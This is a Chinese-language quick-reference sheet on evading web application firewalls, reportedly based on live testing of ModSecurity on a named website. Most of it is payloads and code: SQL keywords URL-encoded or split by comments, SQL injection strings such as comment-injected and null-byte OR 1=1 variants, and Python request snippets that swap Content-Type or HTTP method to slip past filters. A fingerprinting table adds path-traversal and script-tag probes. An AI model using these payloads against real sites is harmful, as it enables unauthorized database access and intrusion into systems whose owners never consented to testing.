# WAF 绕过技术速查

> 基于对 ModSecurity 的实战测试 (9581kk.com, Apache + ModSecurity, HTTP 406)

## 通用测试流程

```
1. 基线测试: 正常请求 → 确认 200
2. 逐词测试: 各敏感词独立测试 → 确认哪些单独不拦截
3. 组合测试: 敏感词组合 → 确认 WAF 规则粒度
4. 绕过测试: 对拦截的组合应用绕过技术
5. 验证: 绕过后的 payload 是否被服务端正确处理
```

## 编码绕过

### 关键词 URL 编码

```
原始    → URL编码
OR      → %4fR, %6fr, %4f%52
AND     → %41ND, %61nd
UNION   → %55NION, %75nion
SELECT  → %53ELECT, %73elect
FROM    → %46ROM, %66rom
WHERE   → %57HERE, %77here
```

### 空白字符替换

```
类型      编码    说明
空格      %20     标准
Tab       %09     PHP WAF 常忽略
换行      %0a     SQL 解析器接受
回车      %0d     可与 %0a 组合
NBSP      %a0     ModSecurity 有时不拦截
注释      /**/    最有效的 WAF 绕过方式
```

### 注释注入 (最高效)

```sql
-- 原始 (被拦截)
' OR '1'='1

-- 注释绕过 (通过)
'/**/OR/**/'1'='1

-- 注释绕过 + 注释 (通过)
admin'/**/OR/**/1=1--

-- %00 绕过 (通过)
admin'%00OR%001=1--
```

## 大小写混淆

ModSecurity 通常配置为区分大小写:

```sql
UnIoN sElEcT → 可能通过
union select  → 可能被拦 (取决于规则)
```

## Content-Type 操控

```python
# 标准表单
requests.post(url, data=payload)
# → 通常被 WAF 检测

# JSON 格式
requests.post(url, json=payload, 
              headers={"Content-Type": "application/json"})
# → 可能绕过规则 (取决于WAF配置)

# Multipart
requests.post(url, files={"field": (None, payload)})
# → 部分 WAF 不检测 multipart body
```

## HTTP 方法切换

```python
# 默认 POST → 被检测
# 切换为 PUT/PATCH/OPTIONS → 可能绕过检测
requests.request("PUT", url, data=payload)
```

## WAF 指纹识别表

| 测试 | ModSecurity 预期 | Cloudflare 预期 |
|:-----|:----------------|:----------------|
| 正常请求 | 200 | 200 |
| `' OR '1'='1` | 406 + Apache | 403 + CF-Ray |
| `../etc/passwd` | 406 | 403 |
| `<script>` | 406 | 403 |
| 响应 Header | `Server: Apache` | `Server: cloudflare` |
| 错误页面含 | `Not Acceptable` | `Attention Required` |

## 已知局限性

- 注释注入 `/**/OR/**/` 通过了 WAF 但 SQL 注入本身可能因参数化查询而失败
- WAF 绕过不等同于漏洞利用成功 — 还需要服务端代码本身存在漏洞
- 连续多次被 WAF 拦截可能导致 IP 被临时/永久封禁
- 不同 WAF 规则集差异很大，测试一家的绕过技术不能直接应用到另一家
